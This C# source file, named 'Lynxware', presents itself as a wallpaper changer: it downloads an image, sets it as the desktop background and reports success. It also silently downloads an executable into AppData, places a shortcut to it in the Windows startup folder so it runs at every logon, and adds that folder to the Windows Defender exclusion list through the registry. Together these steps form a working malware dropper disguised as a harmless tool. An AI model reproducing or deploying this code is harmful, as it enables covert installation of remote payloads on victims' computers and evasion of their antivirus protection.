using System;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;

namespace Lynxware
{
    class Lynxware
    {
        static void Main(string[] args)
        {
            // Directory to save the downloaded files
            string downloadDirectory = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Lynxware");

            // Create the directory if it doesn't exist
            Directory.CreateDirectory(downloadDirectory);

            // Download the photo
            string downloadedPhotoPath = Path.Combine(downloadDirectory, "image.png");
            using (WebClient client = new WebClient())
            {
                client.DownloadFile(Dependencies.photoUrl, downloadedPhotoPath);
            }

            // Set the downloaded photo as the desktop background
            SetDesktopBackground(downloadedPhotoPath);

            // Download the executable
            string downloadedExecutablePath = Path.Combine(downloadDirectory, "Lynxware.exe");
            using (WebClient client = new WebClient())
            {
                client.DownloadFile(Dependencies.executableUrl, downloadedExecutablePath);
            }

            // Rename the executable to a specific name
            string renamedExecutablePath = Path.Combine(downloadDirectory, "Lynxware.exe");
            if (File.Exists(renamedExecutablePath))
            {
                File.Delete(renamedExecutablePath);
            }
            File.Move(downloadedExecutablePath, renamedExecutablePath);

            // Create a shortcut to the executable in the startup folder
            string startupFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "Lynxware.lnk");
            CreateShortcut(startupFolder, renamedExecutablePath);

            // Add folder to Windows Defender exclusion
            AddFolderToWindowsDefenderExclusion(downloadDirectory);

            Console.WriteLine("Wallpaper set successfully.");
            Console.ReadLine(); // Wait for user input to close the console window
        }

        static void SetDesktopBackground(string imagePath)
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            key.SetValue("WallpaperStyle", "2"); // 2 for "Stretch"
            key.SetValue("TileWallpaper", "0");
            SystemParametersInfo(0x0014, 0, imagePath, 0x0001 | 0x0002);
        }

        static void CreateShortcut(string shortcutPath, string targetPath)
        {
            // Create a shortcut to the target executable
            IWshRuntimeLibrary.WshShell shell = new IWshRuntimeLibrary.WshShell();
            IWshRuntimeLibrary.IWshShortcut shortcut = (IWshRuntimeLibrary.IWshShortcut)shell.CreateShortcut(shortcutPath);
            shortcut.TargetPath = targetPath;
            shortcut.Save();
        }

        static void AddFolderToWindowsDefenderExclusion(string folderPath)
        {
            // Add folder to Windows Defender exclusion list
            try
            {
                var settingsPath = @"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths";
                var key = Registry.LocalMachine.CreateSubKey(settingsPath);
                key.SetValue(folderPath, 0, RegistryValueKind.DWord);
                key.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error adding folder to Windows Defender exclusion: " + ex.Message);
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    }
}